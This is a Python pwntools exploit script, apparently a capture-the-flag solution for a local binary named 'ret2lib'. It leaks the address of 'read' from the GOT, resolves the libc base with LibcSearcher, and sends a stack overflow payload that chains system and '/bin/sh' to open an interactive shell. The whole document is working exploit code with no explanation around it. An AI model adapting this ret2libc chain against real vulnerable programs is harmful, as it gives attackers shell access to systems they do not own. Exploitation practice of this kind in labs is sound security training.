from pwn import *
from LibcSearcher import LibcSearcher
fpath = "./ret2lib"

p = process(fpath)
elf = ELF(fpath)

addr_got_read 	= elf.got["read"]

p.recvuntil(":")
p.sendline(str(addr_got_read))
p.recvuntil(": 0x")
addr_read = int(p.recv(8) , 16)
print hex(addr_read)
p.recv()
libc = LibcSearcher("read" , addr_read)
libcbase = addr_read - libc.dump("read")

addr_system 	= libcbase + libc.dump("system")
addr_bin_sh  	= libcbase + libc.dump("str_bin_sh")

payload =  0x3c * 'a'  + p32(addr_system) + p32(0xaaaaaaaa) + p32(addr_bin_sh)
p.sendline(payload)
print payload.encode("hex")
print hex(addr_system)
print hex(addr_bin_sh)
p.recv()
p.interactive()